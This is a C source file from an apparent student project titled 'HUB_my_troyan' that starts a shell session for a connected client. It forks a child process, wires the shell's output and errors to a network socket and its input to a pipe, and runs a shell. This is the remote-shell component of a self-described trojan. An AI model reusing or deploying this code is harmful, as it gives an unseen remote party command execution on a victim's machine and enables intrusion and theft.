/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 shell_client_init.c
*/

#include "app.h"

static void child_process(shell_t *shell, socket_t *client)
{
    char *argv[] = {SHELL_NAME, NULL};

    dup2(shell->pipe[0], STDIN_FILENO);
    dup2(client->fd, STDOUT_FILENO);
    dup2(client->fd, STDERR_FILENO);
    if (execvp(SHELL_NAME, argv) == -1) {
        perror("execvp");
        exit(EXIT_FAILURE);
    }
    close(shell->pipe[0]);
    exit(EXIT_SUCCESS);
}

int shell_client_init(socket_t *client, shell_t *shell)
{
    pid_t child_pid;

    if (pipe(shell->pipe) == -1) {
        perror("pipe");
        return EXIT_FAILURE;
    }
    child_pid = fork();
    if (child_pid == -1) {
        perror("fork");
        return EXIT_FAILURE;
    } else if (child_pid == 0) {
        child_process(shell, client);
    } else {
        close(shell->pipe[0]);
        shell->pid = child_pid;
    }
    return EXIT_SUCCESS;
}